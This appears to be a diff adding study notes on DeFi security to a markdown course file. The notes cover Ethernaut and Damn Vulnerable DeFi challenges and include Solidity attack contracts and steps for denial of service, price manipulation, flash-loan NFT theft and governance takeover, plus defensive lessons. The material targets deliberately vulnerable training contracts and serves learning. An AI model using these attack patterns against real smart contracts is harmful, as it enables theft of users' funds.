@@ -375,3 +375,128 @@ contract String {
    }
 }
 ```
+
+### Module 12: DeFi Security Challenges
+
+#### Overview
+This module covers key DeFi security concepts through Ethernaut and Damn Vulnerable DeFi challenges.
+
+#### Ethernaut Challenges
+
+###### Challenge 9: King
+**Vulnerability**: Denial of Service through ETH rejection
+
+```solidity
+contract KingAttack {
+    constructor(address payable kingGame) {
+        (bool s,) = kingGame.call{value: msg.value}("");
+        require(s, "Failed");
+    }
+
+    receive() external payable {
+        revert("Cannot be king"); 
+    }
+}
+```
+
+**Key Learning**:
+- Smart contracts can prevent others from becoming king by reverting ETH transfers
+- Always validate assumptions about ETH transfers
+- Consider fallback function implications
+
+###### Challenge 22: Dex
+**Vulnerability**: Price manipulation through balance ratios
+
+**Attack Sequence**:
+1. Swap 10 token1 → token2
+2. Swap 20 token2 → token1
+3. Swap 24 token1 → token2
+4. Swap 30 token2 → token1
+5. Swap 41 token1 → token2
+6. Swap 45 token2 → token1
+
+**Price Formula Exploited**:
+```solidity
+price = (amount * IERC20(to).balanceOf(address(this))) 
+        / IERC20(from).balanceOf(address(this))
+```
+
+**Key Learning**:
+- Balance-based pricing is vulnerable to manipulation
+- Small trades can significantly impact exchange rates
+- Need price oracles or time-weighted average prices
+
+###### Challenge 23: DexTwo
+**Vulnerability**: Missing token validation in swap function
+
+```solidity
+contract MaliciousToken {
+    // Create token with minimal DEX balance (1 token)
+    // Exploit price formula: (amount * targetBalance) / maliciousBalance
+    // Example: (1 * 100) / 1 = 100
+    // Single malicious token drains entire balance
+}
+```
+
+**Key Learning**:
+- Always validate input tokens
+- Whitelist approved tokens
+- Check token interfaces and behavior
+
+##### Damn Vulnerable DeFi
+
+###### Free Rider Challenge
+**Vulnerability**: NFT marketplace price validation bypass + flash loan exploitation
+
+```solidity
+contract FreeRiderAttack {
+    function attack() external {
+        // 1. Flash loan WETH from Uniswap
+        uniswapPair.swap(NFT_PRICE, 0, address(this), "flashloan");
+        
+        // 2. Purchase NFTs at exploited price
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+        
+        // 3. Collect bounty
+        transferNFTs(recovery);
+        
+        // 4. Repay flash loan with fees
+        repayFlashLoan();
+    }
+}
+```
+
+**Key Learning**:
+- Validate marketplace prices
+- Consider flash loan impact
+- Implement proper access controls
+
+###### Selfie Challenge
+**Vulnerability**: Governance manipulation via flash loans
+
+```solidity
+contract SelfieAttack {
+    function attack() external {
+        // 1. Flash loan governance tokens
+        pool.flashLoan(amount);
+        
+        // 2. Create governance snapshot
+        token.snapshot();
+        
+        // 3. Queue malicious proposal
+        governance.queueAction(
+            address(pool),
+            abi.encodeWithSignature("drainFunds()")
+        );
+        
+        // 4. Wait timelock
+        // 5. Execute drain
+        governance.executeAction(actionId);
+    }
+}
+```
+
+**Key Learning**:
+- Flash loans can manipulate governance
+- Implement voting delays
+- Consider token borrowing in voting power
